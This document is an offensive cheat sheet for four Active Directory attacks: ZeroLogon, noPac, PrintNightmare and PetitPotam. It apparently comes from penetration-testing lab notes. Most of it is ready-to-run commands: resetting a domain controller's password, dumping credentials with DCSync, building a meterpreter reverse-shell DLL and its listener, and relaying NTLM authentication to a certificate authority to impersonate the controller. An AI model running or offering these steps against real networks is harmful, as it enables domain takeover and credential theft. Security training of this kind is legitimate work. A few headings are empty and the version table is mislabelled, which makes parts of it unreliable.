# Common Active-Directory Vulnerabilities
## ZeroLogon
### Overview
**CVE:** CVE-2020-1472
**The Logic:** This is a pure cryptographic failure in the Netlogon Remote Protocol (MS-NRPC). It relies on a "1 in 256" chance of being right.
1. **Broken Crypto:** Netlogon uses an initialization vector (IV) for AES-CFB8 encryption that is supposed to be random. Microsoft accidentally set it to be **all zeros**.
2. **The Brute Force:** An attacker sends a stream of zeros as the "ciphertext." Because of the math error, there is a **1 in 256 chance** that a ciphertext of all zeros will produce a plaintext of all zeros.
3. **The Reset:** By spamming these requests, the attacker eventually "authenticates" without a password. They then use their new "permission" to tell the DC: "Change your own machine account password to an **empty string**."
### Scanning - Netexec
```bash
nxc smb 172.16.5.5 -M zerologon
```
### Scanning - Nmap -> subnet
```bash
nmap -p 445 --script smb-vuln-cve2020-1472 172.16.5.0/24
```
### Scanning - Public PoC
```bash
python3 zerologon_tester.py ACADEMY-EA-DC01 172.16.5.5
```

### Exploitation
#### 1. Reset the Password to Empty (**WARNING:** This step is destructive. It breaks the DC's ability to replicate with other DCs and will eventually crash the domain if not restored)
```BASH
python3 cve-2020-1472-exploit.py ACADEMY-EA-DC01 172.16.5.5
```
#### 2. Verify the password reset (empty pass NT hash = `31d6cfe0d16ae931b73c59d7e0c089c0`)
```bash
nxc smb 172.16.5.5 -u 'ACADEMY-EA-DC01$' -H 31d6cfe0d16ae931b73c59d7e0c089c0
```
#### 3. Perform DCSync
```bash
impacket-secretsdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5'
```
#### 4. Cleaning and restoring step (To not lose Domain trusts with other domains)
- Get original Hex password - using the administrator hash we dumped in the DCSync
```bash
impacket-secretsdump -hashes <Admin_NT_Hash> 'administrator@172.16.5.5'
```
#### 5. Reinstall the original password
```bash
python3 restorepassword.py INLANEFREIGHT/ACADEMY-EA-DC01@ACADEMY-EA-DC01 -target-ip 172.16.5.5 -hexpass <HEX_STRING_HERE>
```
## noPac
### Overview
**CVEs:** CVE-2021-42278 & CVE-2021-42287
**The Logic:** This exploit tricks the Domain Controller (DC) by exploiting a logic flaw in how it handles computer account names and Kerberos tickets.
1. **Name Spoofing:** An attacker creates a new computer account (e.g., `TEMP-PC$`) and renames it to match a Domain Controller but **without** the trailing `$` (e.g., `DC01`).
2. **The Request:** The attacker requests a Kerberos Ticket (TGT) for this renamed account.
3. **The Switch:** Before using the ticket, the attacker renames their computer account back to the original name (`TEMP-PC$`).
4. **The Promotion:** When the attacker uses that TGT to request a service ticket (SGS), the DC looks for the account `DC01`. It doesn't find it, so it automatically adds the `$` to the search. It finds the **real** Domain Controller (`DC01$`) and issues a ticket with **Domain Admin** privileges.
### Scanning - Netexec SMB module
```bash
nxc smb 192.168.56.11 -u 'jon.snow' -p 'iknownothing' -M nopac
```
### scanning - [noPac](https://github.com/Ridter/noPac) scanner.py
```bash
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```
### Exploitation - Semi-interactive shell (NOTE: noPac.py saves the TGT on our machine once succeed!)
```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```
### Exploitation - DCSync the Built-in Administrator Account
```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```
### Exploitation - DCSync using Impacket-secretsdump
```
export KRB5CCNAME=administratot@domain.local.ccache
```
```
impacket-secretsdump -k domain.local
```
## PrintNightmare
### Overview
on Windows Server 2019 hosts
**CVE:** CVE-2021-34527
**The Logic:** This is a classic "Features as a Flaw" bug in the Windows Print Spooler service (`spoolsv.exe`).
1. **RPC Abuse:** The Spooler service allows users to install printer drivers remotely via RPC calls (specifically `RpcAddPrinterDriverEx`).
2. **Remote Loading:** The vulnerability allows an authenticated user to specify a path to a **remote SMB share** containing a malicious `.dll` disguised as a printer driver.
3. **SYSTEM Execution:** Because the Spooler service runs with `NT AUTHORITY\SYSTEM` privileges, it pulls that DLL from your share and executes it locally to "install" the driver. This gives you instant SYSTEM access.
### Scanning - Netexec `printnightmare` smb module
```bash
nxc smb <IP> -u 'user' -p 'passssword' -M printnightmare
```
### Scanning - rpc
```bash
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```
### Scanning - metasploit
```bash
use auxiliary/admin/dcerpc/printnightmare_scanner
set RHOSTS 172.16.5.5
run
```
### Exploitation
#### 1. Generate a malicious DLL file using `msfvenom`
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```
#### 2. Setup a network share hosting the DLL file
```BASH
sudo impacket-smbserver -smb2support CompData /path/to/backupscript.dll
```
#### 3. Start the meterpreter listener
```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.3.88.114; set LPORT 8080; run"
```
#### 4. Trigger the attack
```bash
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```
## PetitPotam
### Overview
**CVE:** CVE-2021-36942
**The Logic:** This isn't an exploit that gives you a shell directly; it is a **Coercion** attack. It forces a target to talk to you so you can steal its identity.
1. **The Trigger:** You use the MS-EFSRPC (Encrypting File System Remote Protocol) to tell the Domain Controller: "Hey, I have a file encrypted for you, come get it from my machine."
2. **The Auth:** The DC dutifully attempts to connect to your machine. To do so, it must authenticate using its **Machine Account NTLM Hash**.
3. **The Relay:** You don't "crack" this hash. Instead, you **Relay** it to another service (usually the AD CS Web Enrollment page). The CA (Certificate Authority) sees the DC's "proof of identity" and issues you a certificate for the DC, which you can use to impersonate it forever.
### Scanning - netexec
```bash
nxc smb 172.16.5.5 -u 'user' -p 'pass' -M petitpotam
```
### Scanning - 
### Exploitation
#### 1. Find the Certificate authority
using **certipy** we can get the Hostname of the CA, which we will relay to.
#### 2. Setup the relay using **ntlmrelayx**
```bash
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```
#### 3. Coerce the request from the Domain controller to our machine
- using **petitpotam.py**
```bash
python3 PetitPotam.py <attack host IP> <Domain Controller IP>
```
- using **mimikatz**
```misc
misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>
```
#### 4. Receive the bas64 encoded certificate and Get a TGT for the Domain Controller
- on the ntlmrelayx terminal we should get the base64 encoded certificate for the domain controller
- using gettgtpkinit.py to get TGT using this Base64 encoded certificate
```bash
python3 gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY dc01.ccache
```
#### 5. dump NTDS.dit
```bash
export KRB5CCNAME=dc01.ccache
```
```bash
Impacket-secretsdump -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
- we can also opatain the NT hash of our target using `getnthash.py` and the AS-REP key
```bash
python3 getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```
### Windows - exploitation
- after getting the base64 certificate we can use Rubeus to get the TGT
```POWERSHELL
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt /nowrap
```
- Since we got the TGT of the Domain admin, now we can perform DCSync using mimikatz
```cmd
lsadump::dcsync /user:inlanefreight\krbtgt
```

## Quick Version checking and mapped vulnerability
### Inspect the version remotely
```cmd
wmic qfe list brief /format:table
```
### lookup the version in the table below

| **Vulnerability**  | **"Safe" OS Version (Pre-Patch)** | **Cutoff Date** | **Target Service** |
| ------------------ | --------------------------------- | --------------- | ------------------ |
| **ZeroLogon**      | Server 2008 R2 - 2019             | Aug 2020        | Netlogon           |
| **noPac**          | Server 2012 R2 - 2019             | Nov 2021        | Kerberos / PAC     |
| **PrintNightmare** | All Windows Versions              | July 2021       | Print Spooler      |
| **PetitPotam**     | All Windows Servers               | N/A (Hardening) | EFSRPC             |
